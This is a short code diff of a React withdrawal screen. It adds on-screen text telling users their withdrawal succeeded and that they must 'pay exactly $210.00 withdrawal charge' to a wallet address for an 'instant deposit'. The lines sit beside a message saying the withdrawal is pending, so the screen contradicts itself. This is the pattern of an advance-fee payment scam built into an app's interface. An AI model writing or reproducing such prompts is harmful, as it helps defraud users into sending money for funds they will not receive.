@@ -240,6 +240,8 @@ function Withdraw() {
               Your withdrawal of {formatUsd(done.amount)} has been placed successfully.
             </p>
             <p className="mt-1 text-sm font-medium text-muted-foreground">
+  Your withdrawal of  {formatUsd(done.amount)} has been placed successfully.
+Pay exactly $210.00 withdrawal charge to the wallet address below and refresh your cashapp for instant deposit
   Your withdrawal of  {formatUsd(done.amount)} is pending
 </p>
 
